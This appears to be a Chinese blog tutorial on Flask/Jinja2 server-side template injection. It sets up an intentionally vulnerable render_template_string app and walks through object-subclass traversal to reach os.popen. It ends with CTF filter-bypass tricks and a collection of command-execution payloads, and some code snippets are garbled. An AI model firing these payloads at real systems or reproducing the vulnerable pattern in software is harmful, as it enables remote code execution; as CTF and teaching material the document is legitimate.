---
title: python-SSTI模板注入 - 海屿-uf9n1x - 博客园
date: 2023-04-19T12:00:00+08:00
categories:
  - Web安全
tags:
  - SSTI
  - Python
---

# 一、python_SSTI模板注入介绍
### ssti漏洞成因
ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。

### 模板引擎
首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。

模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。

通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。

后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。

前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。

让我们用例子来简析模板渲染。

```xml

{$what}

```

我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为

```xml

张三

```

当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。

### 什么是服务端模板注入
通过模板，我们可以通过输入转换成特定的HTML文件，比如一些博客页面，登陆的时候可能会返回 hi,张三。这个时候张三可能就是通过你的身份信息而渲染成html返回到页面。通过Twig php模板引擎来做示例。

```php
$output = $twig->render( $_GET[‘custom_email’] , array(“first_name” => $user.first_name) );

```

可能你发现了它存在XSS漏洞，直接输入XSS代码便会弹窗，这没错，但是仔细观察，其他由于代码不规范他还存在着更为严重的ssti漏洞，假设我们的

url:xx.xx.xx/?custom_email={{7*7} }

将会返回49

我们继续custom_email={{self} }

```xml
 

```

是的，在{{}}里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。接下来我们会讲到重点。敲黑板。

### flask环境本地搭建(略详)
搭建flask我选择了 pycharm，学生的话可以免费下载专业版。下载安装这一步我就不说了。

环境：python 3.6+

基础：0-

简单测试

pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.X，毕竟django的都快要不支持2.X了，早换早超生。自动导入的也是python 3.6。

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY0NzI3LTBiOGE1NjcyLTA0ZmQtMS5wbmc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221164727-0b8a5672-04fd-1.png)

运行这边会出小错，因为此时我们还没有安装flask模块，

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY0NzQ1LTE2NDU1MDU4LTA0ZmQtMS5wbmc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221164745-16455058-04fd-1.png)

这样就可以正常运行了，运行成功便会返回

```python
* Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
127.0.0.1 - - [14/Dec/2018 20:32:20] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [14/Dec/2018 20:32:20] "GET /favicon.ico HTTP/1.1" 404 -

```

此时可以在web上运行hello world了，访问[http://127.0.0.1:5000](http://127.0.0.1:5000/) 便可以看到打印出Hello World

### route装饰器路由

```python
@app.route('/')

```

使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如

```python
@app.route('/')
def test()"
 return 123

```

访问127.0.0.1:5000/则会输出123，我们修改一下规则

```python
@app.route('/test')
def test()"
 return 123

```

这个时候访问127.0.0.1:5000/test会输出123.

此外还可以设置动态网址，

```python
@app.route("/hello/")
def hello_user(username):
 return "user:%s"%username

```

根据url里的输入，动态辨别身份，此时便可以看到如下页面：

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY0ODQ5LTNjMjJlNjc4LTA0ZmQtMS5wbmc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221164849-3c22e678-04fd-1.png)

或者可以使用int型，转换器有下面几种：

```python
int 接受整数float 同 int ，但是接受浮点数path 和默认的相似，但也接受斜线@app.route('/post/')def show_post(post_id): # show the post with the given id, the id is an integer return 'Post %d' % post_id

```

### main入口
当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。

```python
if __name__ == '__main__':
 app.debug = True
 app.run()

```

测试的时候，我们可以使用debug，方便调试，增加一句

```python
app.debug = True

```

或者（效果是一样的）

app.run(debug=True)

这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。

```javascript
app.run(host='0.0.0.0')

```

这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。

### 模板渲染（重点）
你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:

简单的模版渲染示

```python
from flask import render_template
@app.route('/hello/')
@app.route('/hello/')

def hello(name=None):
 return render_template('hello.html', name=name)//我们hello.html模板未创建所以这段代码暂时供观赏，不妨往下继续看

```

我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名- -！，所以我们先从flask模版渲染入手深入剖析。

首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。

```javascript
├── app.py ├── static │ └── style.css └── templates └── index.html

```

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY1MDUwLTg0M2IxZjJhLTA0ZmQtMS5wbmc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221165050-843b1f2a-04fd-1.png)

我们写一个index.html文件写templates文件夹中。

```xml

 
 {{title}} - 小猪佩奇
 
 
 # Hello,{{user.name}}!
 

```

里面有两个参数需要我们渲染，user.name，以及title

我们在app.py文件里进行渲染。

```python
@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转

def index():
 user = {'name': '小猪佩奇'}#传入一个字典数组
 return render_template("index.html",title='Home',user=user)

```

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY1MTQzLWE0MjVjNWM0LTA0ZmQtMS5wbmc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221165143-a425c5c4-04fd-1.png)

Image这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。

# flask实战
此时我们环境已经搭建好了，可以进行更深一步的讲解了，以上好像我们讲解使用了php代码为啥题目是flask呢，没关系我们现在进入重点!!!--》》flask/jinja2模版注入

Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。这里我们提前给出漏洞代码。访问http://127.0.0.1:5000/test 即可

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string
app = Flask(__name__)

@app.route('/test',methods=['GET', 'POST'])
def test():
 template = '''
 

 # Oops! That page doesn't exist.

 ### %s

 
 ''' %(request.url)
 return render_template_string(template)
if __name__ == '__main__':
 app.debug = True
 app.run()

```

## flask漏洞成因
为什么说我们上面的代码会有漏洞呢，其实对于代码功底比较深的师傅，是不会存在ssti漏洞的，被一些偷懒的师傅简化了代码，所以造成了ssti。上面的代码我们本可以写成类似如下的形

```xml

 
 {{title}} - 小猪佩奇
 
 
 # Hello, {{user.name}}!
 

```

里面有两个参数需要我们渲染，user.name，以及title

我们在app.py文件里进行渲染。

```python
@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
 return render_template("index.html",title='Home',user=request.args.get("key"))

```

也就是说，两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果我们使用render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码{{}}你将会发现如下：

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY1MjQ2LWM5YmExMDJlLTA0ZmQtMS5qcGc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221165246-c9ba102e-04fd-1.jpg)

即使username可控了，但是代码已经并不生效，并不是你错了，是代码对了。这里问题出在，良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了。你的模板渲染其实已经不可控了。而漏洞代码的问题出在这里

```python
def test():
 template = '''
 
 # Oops! That page doesn't exist.
 ### %s
 
 ''' %(request.url)

```

注意%（request.url），程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的，这也正是flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。现在你已经明白了flask的ssti成因以及代码了。接下来我们进入实战。

## 本地环境进一步分析
上面我们已经放出了漏洞代码无过滤版本。现在我们深究如何利用ssti攻击。

现在我们已经知道了在flask中{{}}里面的代码将会执行。那么如何利用对于一个python小白可能还是一头雾水，如果之前没有深入学习过python，那么接下来可以让你对于poc稍微有点了解。进入正题。

在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。

我们在pycharm中运行代码

```php
print("".__class__)

```

返回了<class 'str'>，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个**bases**属性，列出其基类。现在我们写代码。

```php
print("".__class__.__bases__)

```

打印返回(<class 'object'>,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用**mro**，**mro**给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。

```php
print("".__class__.__mro__)

```

可以看到返回了(<class 'str'>, <class 'object'>)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，**mro**返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,**subclasses**() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。

```php
print("".__class__.__bases__[0].__subclasses__())

```

python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。打印如下：

```python
[, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ]

```

接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。<class 'os._wrap_close'>，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。

```css
http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118]}}

```

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY1NDE5LTAwYmE4MTMwLTA0ZmUtMS5qcGc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221165419-00ba8130-04fe-1.jpg)

这个时候我们便可以利用.**init**.**globals**来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。

```css
http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}

```

此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。

```bash
http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}

```

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY1NDUyLTE0YzZiZDU2LTA0ZmUtMS5qcGc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221165452-14c6bd56-04fe-1.jpg)

此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。

### ctf中的一些绕过tips
没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。

1.过滤[]等括号

使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}

绕过后{{"".**class**.**bases**.**getitem**(0)}}

2.过滤了subclasses，拼凑法

原poc{{"".**class**.**bases**[0].**subclasses**()}}

绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}

3.过滤class

使用session

poc{{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```css
{{session['__cla'+'ss__'].__mro__[12]}}

```

或者

```css
request['__cl'+'ass__'].__mro__[12]}}

```

4.timeit姿势

可以学习一下 2017 swpu-ctf的一道沙盒python题，

这里不详说了，博大精深，我只意会一

```python
import timeittimeit.timeit("__import__('os').system('dir')",number=1)import platformprint platform.popen('dir').read()

```

5.收藏的一些poc

```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()' )
object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}

```

还有就可以参考一下P师傅的 [https://p0sec.net/index.php/archives/120/](https://p0sec.net/index.php/archives/120/)

### 漏洞挖掘
对于一些师傅可能更偏向于实战，但是不幸的是实战中几乎不会出现ssti模板注入，或者说很少，大多出现在python 的ctf中。但是我们还是理性分析下。

每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则,就如同 SQL 注入中有着不同的数据库类型一样。更改请求参数使之承载含有模板引擎语法的 Payload,通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析,不同的引擎不同的解析。所以我们在挖掘之前有必要对网站的web框架进行检查，否则很多时候{{}}并没有用，导致错误判断。

接下来附张图，实战中要测试重点是看一些url的可控，比如url输入什么就输出什么。前期收集好网站的开发语言以及框架，防止错误利用{{}}而导致错误判断。如下图较全的反映了ssti的一些模板渲染引擎及利用。

[![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgxMjIxMTY1NjI3LTRkMTY3NjI0LTA0ZmUtMS5wbmc?x-oss-process=image/format,png)](https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png)

文章知识点与官方知识档案匹配，可进一步学习相关知识

# 二、SSTI的payload构造思路
### 1.内置的方法和属性
有些对象类型内置了一些可读属性，它们不会被dir()列举出来。

属性/方法

描述

instance.*class*

类实例所属的类

class.*bases*

类对象（类也是对象）的基类元组

definition.*name*

类、函数、方法、描述符或生成器实例的名称。

class.*mro*

此属性是在方法解析期间查找基类时考虑的类元组。

class.*subclasses*()

每个类都保留一个对其直接子类的弱引用列表。此方法返回所有仍然存活的引用的列表。该列表按定义顺序排列。

module.*dict*

包含模块的符号表的字典，包括标识符名称和它的引用

*builtins*

一般被模块作为全局变量提供，它的值或者是builtins模块的引用，或者是则这个模块的__dict__属性。如果是builtins模块，该模块提供Python的所有“内置”标识符的直接访问，例如open函数builtins.open()。这个变量在定义与内置函数同名的模块有用处，可以通过它访问内置的同名函数。另外，还可以通过它修改某些标识符的作用。

判断一个模块是否有_builtins_：__builtins__变量是对builtins模块的引用，在sys模块导入了builtins模块的，sys模块是由Python/sysmodule.c编译的，也就是说当一个模块直接或间接（导入的模块里面）导入了sys模块。sys模块是由c程序编译的，但它没有__builtins__变量。

__builtins__的值是当前模块引用的builtins模块：

```python
__builtins__

```

module.__builtins__的值是指定模块的所有标识符的字典，与__dict__相比，除了变量，还多出了其它标识符，例如：

```python
os.__builtins__['TimeoutError']

```

属性/方法

描述

*import*()

内置函数，它在importlib包下的_bootstrap模块下定义的__import__()方法的实现，在程序运行开始时，这个包就被导入，所以这个方法也被导入当成内置函数。
method._

globals_

在指定的方法处的全局命名空间（等同于dir(), globals()）。method不能是内置的方法名，而是自己定义或者重写的，重写的__init__也算。

object.*new*(cls[…])

对象的内置方法，创建新实例时自动调用，用以定制实例的创建过程。传入对象所属的类，其余参数是构造器的参数相同，这个方法返回一个实例，只有这个方法返回实例，对象内置的_init_()才会被调用。

object.*init*(self[…])

对象的内置方法，*new*()之后，给调用者返回实例之前调用。如果基类有自定义的__init__()，那么添加super().**init**([…])，对基类部分进行初始化。这个方法返回的值只能是None，否则会引发TypeError。Python本质上是动态的，而不是静态的。虚拟机具有变量的可寻址命名空间，而不是编译后的对象代码中的符号表。

dir()/dir(module)

返回在该点的有效命名空间，返回一个字典，每个键值对对应一个变量和它的值，

globals()

返回变量名和它的变量值的字典，这些变量在作用域中是视为全局的。

locals()

返回变量名和它的变量值的字典，这些变量在作用域中是视为局部的。

### 2.原理
SSTI的原理是服务器端接收了用户可控的数据，将其作为参数值传入模板引擎，如果这些数据是python代码的字符串，就会被当成代码来执行。

模板引擎解析的文本类似于这样的：

```python
{{ 4*2 }}

```

{{}}是模板表达式，它将执行里面的表达式内容，并输出。所以上面的结果为：

```python
# 8

```

如果我们可以在文本传入给模板引擎解析之前，对文本进行修改，那么在它里面增加模板表达式等其它能执行python代码的模板语法，就会造成代码注入。例如

```python
text = "# %s<>" % input
render_template_string(text)

```

input可控，注入模板表达式，并在里面增加代码：

```
input = "{{ 7*2 }}"

```

text变成：

```python
text = "{{ 7*2 }}"

```

然后再传入模板引擎解析：

```python
render_template_string(text)

```

如何利用

首先构造一个能执行函数的payload，这里的函数可以是任何自己想要的功能，比如想执行系统命令，可以调用popen()，subprocess()等等；想读取文件，可以调用open()函数。

（1）不管最终想执行什么函数，payload前面的一部分一般都是想拿到基类object的所有子类：

```python
''.__class__.__base__.__subclasses__()

```

解释：

''是一个对象，__class__是这个对象所属的类，__base__是指定类的基类（父类），**subclasses**()是Object类的静态方法，返回它的所有子类，包含在一个字典中，键是类名，值是类的引用。

（2）现在我们拿到了所有继承Object类的子类的引用，在调用这些子类的方法时，如果命名空间没有这个类，解析器就会尝试导入包含这个类的模块，例如有个子类叫os._AddedDllDirectory：

> ```python
> ''.__class__.__base__.__subclasses__()[139]
> 
> 
> ```

os就是它的模块名，解析器就会尝试去加载并执行os模块的代码，但不会把os这个变量放进命名空间中（说到底，import os的os变量保存是模块的地址，换句话说，命名空间保存的是存储地址的变量，这个地址有可能指向一个值，一个类，一个函数，或者一个模块，总之是一块代码的首地址）。

（3）在解析器加载并执行某个模块的代码时，例如os模块的代码，里面又导入了其它的模块(import sys)，这些模块与os定义了一些变量，函数和类，解析器把它们添加到当前的命名空间，接下来通过__globals__获得当前的命名空间，不过它需要一个方法作为调用者，这里我们选一些魔术方法，因为它们的方法名固定，例如__init__、__enter__或__exit__等等。

再补充payload：

```python
''.__class__.__base__.__subclasses__()[139].__init__.__globals__

```

（4）因为os模块的执行，导致sys模块的导入(import sys)，也就是说当前的命名空间有了sys这个变量，它保存了sys模块的地址，通过这个变量可以调用它里面（与变量绑定在一起）的方法、类等成员，sys模块里面有个modules字典，它保存的是已加载模块**（已加载但未必在命名空间有对应的变量）**的名称与其地址的映射。

```python
还可以通过给 sys.modules 这个字典加入元素，以强制加载某个模块。

```

```python
''.__class__.__base__.__subclasses__()[139].__init__.__globals__['sys'].modules['os']

```

（5）拿到os模块的地址后，就可以使用里面的方法了，其中有个popen方法就是想利用的方法，通过它执行shell命令：

```python
''.__class__.__base__.__subclasses__()[139].__init__.__globals__['sys'].modules['os'].popen('ls')

```

```python
''.__class__.__base__.__subclasses__()[139].__init__.__globals__['sys'].modules['os'].popen('ls')

```

（6）popen()返回一个输出流，通过read()读取里面的数据：

```python
''.__class__.__base__.__subclasses__()[139].__init__.__globals__['sys'].modules['os'].popen('ls').read()

```

### 3.总结利用思路
（1）明确要利用的目标函数；

（2）找到目标函数被定义的位置，哪个模块（目标模块），或者哪个类（目标类）。

（3）构造前一部分payload，大部分思路是固定的，目的是拿到所有Object类的子类。

（4）这些子类很多没有加载，调用它们里面显式定义的方法，解析器就会加载并执行这个模块，如果模块刚好存在目标函数，就跳到第六步。（直接找到目标函数）

（5）如果第五步加载的模块没有目标函数，就考虑在被加载模块中存在导入目标模块的import语句。（间接导入）

（6）导入了目标函数或者目标模块后，在当前的命名空间就存在它们的变量，接下来就通过这些变量作为调用者，调用目标函数。

```python
一般来说，可以利用的函数有：open(), popen(), subprocess(), system()

```

总之，构造payload的思路是曲折的，能利用的属性、变量、函数、类等成员很多，调用过程曲折，自由发挥的空间比较大。

附带脚本

# 用于搜索想利用的目标函数所在的类

```python
search = 'popen'
num = -1
for c in ''.__class__.__base__.__subclasses__()
	num += 1
 try:
 if search in c.__init__.globals__.keys():
 print(c, num)
 except:
 pass

```

### 4.payload的收集

```python
{{''.__class__.__base__.__subclasses__()[169].__init__.__globals__['sys'].modules['os'].popen("cat /flag").read()}}

// os._wrap_close类中的popen
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

// __import__方法
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}

// __builtins__
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

// Jinja2创建的url_for()方法
{{url_for.__globals__.os.popen("cat /flag").read()}}

```